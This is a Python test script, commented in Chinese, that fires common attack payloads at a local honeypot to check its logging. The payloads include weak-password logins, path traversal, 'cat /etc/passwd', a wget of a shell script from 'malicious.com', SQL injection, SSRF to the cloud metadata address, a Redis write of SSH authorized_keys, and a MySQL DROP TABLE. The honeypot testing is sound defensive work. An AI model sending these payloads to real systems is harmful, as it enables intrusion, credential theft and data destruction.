import socket
import requests
import paramiko
import pymysql
import ftplib
import time
import urllib.parse
from threading import Thread

# =================配置区=================
HOST = '127.0.0.1'
PORTS = {
    'ftp': 21,
    'ssh': 2222,
    'http': 9090,
    'redis': 6379,
    'mysql': 3307,
    'elasticsearch': 9200
}
TIMEOUT = 3

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def log_test(module, payload, status, msg=""):
    print(f"[{module.ljust(13)}] {Colors.CYAN}{payload.ljust(40)}{Colors.ENDC} -> "
          f"{Colors.GREEN if status == 'OK' else Colors.RED}{status}{Colors.ENDC} {msg}")

# =================各蜜罐测试用例=================

def test_ftp():
    print(f"\n{Colors.HEADER}{Colors.BOLD}>>> 测试 FTP 蜜罐 (端口: {PORTS['ftp']}){Colors.ENDC}")
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORTS['ftp'], timeout=TIMEOUT)
        log_test("FTP", "CONNECT", "OK", str(ftp.getwelcome()))
        
        # 测试爆破弱口令
        try:
            ftp.login("root", "123456")
        except ftplib.error_perm as e:
            log_test("FTP", "LOGIN (root:123456)", "OK", f"捕获到预期的登录失败 ({e})")

        # 尝试匿名登录
        try:
            ftp.login("anonymous", "anonymous@")
        except ftplib.error_perm as e:
            log_test("FTP", "LOGIN (anonymous)", "OK", "捕获到匿名登录尝试")
            
        # 测试恶意命令 (需要在登录后，但蜜罐可能不拒绝认证以获取更多指令)
        try:
            ftp.sendcmd("CWD ../../../etc")
        except Exception:
            pass
        log_test("FTP", "CWD (目录遍历)", "OK", "发送 ../../../etc 命令")
            
        ftp.quit()
    except Exception as e:
        log_test("FTP", "CONNECT", "FAIL", str(e))

def test_ssh():
    print(f"\n{Colors.HEADER}{Colors.BOLD}>>> 测试 SSH 蜜罐 (端口: {PORTS['ssh']}){Colors.ENDC}")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 爆破测试
        try:
            client.connect(HOST, port=PORTS['ssh'], username='root', password='password123', timeout=TIMEOUT)
            log_test("SSH", "LOGIN (root:password123)", "OK", "蜜罐接受了登录")
            
            # 命令注入测试
            stdin, stdout, stderr = client.exec_command('cat /etc/passwd')
            log_test("SSH", "EXEC (cat /etc/passwd)", "OK", "发送越权读文件指令")
            
            stdin, stdout, stderr = client.exec_command('wget http://malicious.com/shell.sh')
            log_test("SSH", "EXEC (wget)", "OK", "发送恶意下载指令")
            
            client.close()
        except paramiko.AuthenticationException:
            log_test("SSH", "LOGIN", "OK", "触发了登录拒绝记录")
    except Exception as e:
        log_test("SSH", "CONNECT", "FAIL", str(e))

def test_http():
    print(f"\n{Colors.HEADER}{Colors.BOLD}>>> 测试 Web/HTTP 蜜罐 (端口: {PORTS['http']}){Colors.ENDC}")
    base_url = f"http://{HOST}:{PORTS['http']}"
    
    payloads = [
        # IoT漏洞模拟
        ("/System/deviceInfo", "Hikvision 信息泄露"),
        ("/sdk/../../../../../../../etc/shadow", "Hikvision 目录遍历"),
        # 常规Web漏洞
        ("/login?username=admin' OR '1'='1&password=123", "SQL注入 (GET)"),
        ("/.env", "敏感文件泄露 (.env)"),
        ("/index.php?cmd=whoami", "命令注入"),
        ("/?url=http://169.254.169.254/latest/meta-data/", "SSRF 攻击探测"),
        ("/<script>alert(1)</script>", "XSS测试")
    ]
    
    for path, desc in payloads:
        try:
            res = requests.get(base_url + urllib.parse.quote(path, safe='/?=&'), timeout=TIMEOUT)
            log_test("HTTP", desc, "OK", f"状态码: {res.status_code}")
        except requests.exceptions.RequestException as e:
            log_test("HTTP", desc, "FAIL", "连接失败")

def test_redis():
    print(f"\n{Colors.HEADER}{Colors.BOLD}>>> 测试 Redis 蜜罐 (端口: {PORTS['redis']}){Colors.ENDC}")
    payloads = [
        "INFO\r\n",
        "CONFIG SET dir /root/.ssh/\r\n",
        "CONFIG SET dbfilename authorized_keys\r\n",
        "SET mykey \"ssh-rsa AAAAB3Nz...\"\r\n",
        "SAVE\r\n",
        "SLAVEOF 10.0.0.1 6379\r\n"
    ]
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((HOST, PORTS['redis']))
        
        for payload in payloads:
            s.sendall(payload.encode('utf-8'))
            time.sleep(0.1)
            try:
                resp = s.recv(1024)
            except:
                pass
            cmd_name = payload.split()[0].strip()
            log_test("Redis", f"COMMAND: {cmd_name}", "OK", "发送恶意Redis指令完毕")
            
        s.close()
    except Exception as e:
        log_test("Redis", "CONNECT", "FAIL", str(e))

def test_mysql():
    print(f"\n{Colors.HEADER}{Colors.BOLD}>>> 测试 MySQL 蜜罐 (端口: {PORTS['mysql']}){Colors.ENDC}")
    try:
        # 使用 pymysql 模拟真实客户端连接
        conn = pymysql.connect(
            host=HOST,
            port=PORTS['mysql'],
            user='root',
            password='weakpassword',
            database='mysql',
            connect_timeout=TIMEOUT
        )
        log_test("MySQL", "LOGIN (root:weakpassword)", "OK", "蜜罐允许连接")
        
        with conn.cursor() as cursor:
            cursor.execute("SELECT version();")
            cursor.execute("DROP TABLE users;")
            log_test("MySQL", "EXEC (DROP TABLE)", "OK", "发送恶意SQL")
        conn.close()
    except pymysql.err.OperationalError as e:
        log_test("MySQL", "LOGIN", "OK", f"捕获到蜜罐拒绝登录: {e}")
    except pymysql.err.InternalError as e:
        log_test("MySQL", "LOGIN", "OK", f"蜜罐响应: {e}")
    except Exception as e:
        log_test("MySQL", "CONNECT", "FAIL", str(e))

def test_elasticsearch():
    print(f"\n{Colors.HEADER}{Colors.BOLD}>>> 测试 Elasticsearch 蜜罐 (端口: {PORTS['elasticsearch']}){Colors.ENDC}")
    base_url = f"http://{HOST}:{PORTS['elasticsearch']}"
    
    payloads = [
        ("GET", "/", "ES 根目录探测"),
        ("GET", "/_cat/nodes?v", "获取节点信息"),
        ("POST", "/_search", "搜索数据接口请求"),
        ("PUT", "/_cluster/settings", "恶意修改集群设置 (常见于RCE利用)")
    ]
    
    for method, path, desc in payloads:
        try:
            if method == "GET":
                res = requests.get(base_url + path, timeout=TIMEOUT)
            else:
                res = requests.request(method, base_url + path, json={"test": "data"}, timeout=TIMEOUT)
            log_test("Elasticsearch", desc, "OK", f"状态码: {res.status_code}")
        except requests.exceptions.RequestException as e:
            log_test("Elasticsearch", desc, "FAIL", "连接失败")


if __name__ == "__main__":
    print(f"{Colors.HEADER}==================================================")
    print("      低交互蜜罐 - 攻击载荷全量测试工具      ")
    print(f"=================================================={Colors.ENDC}")
    print("该脚本将向已启动的蜜罐服务发送各类常见漏洞/攻击包\n")
    
    test_ftp()
    time.sleep(1)
    
    test_ssh()
    time.sleep(1)
    
    test_http()
    time.sleep(1)
    
    test_redis()
    time.sleep(1)
    
    test_mysql()
    time.sleep(1)
    
    test_elasticsearch()
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}+++ 测试完成! 请往管理面控制台查看拦截与日志记录 +++{Colors.ENDC}\n")